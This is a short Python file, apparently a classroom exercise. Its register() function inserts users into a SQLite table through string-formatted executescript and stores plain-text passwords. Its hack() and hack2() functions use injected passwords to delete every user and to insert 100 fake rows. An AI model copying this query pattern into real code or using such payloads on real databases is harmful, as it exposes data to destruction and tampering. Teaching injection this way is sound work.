import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect('../homework.db') as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()


def hack() -> None:
    username: str = "I like"
    password: str = "'); DELETE FROM table_users; --"
    register(username, password)


def hack2() -> None:
    data = str([('username_' + str(i), 'password_' + str(i)) for i in range(100)])[1:-1]
    username = "I like"
    password = f"password'); INSERT INTO table_users (username, password) VALUES {data}; --"
    register(username, password)


if __name__ == '__main__':
    register('wignorbo', 'sjkadnkjasdnui31jkdwq')
    hack()
    hack2()
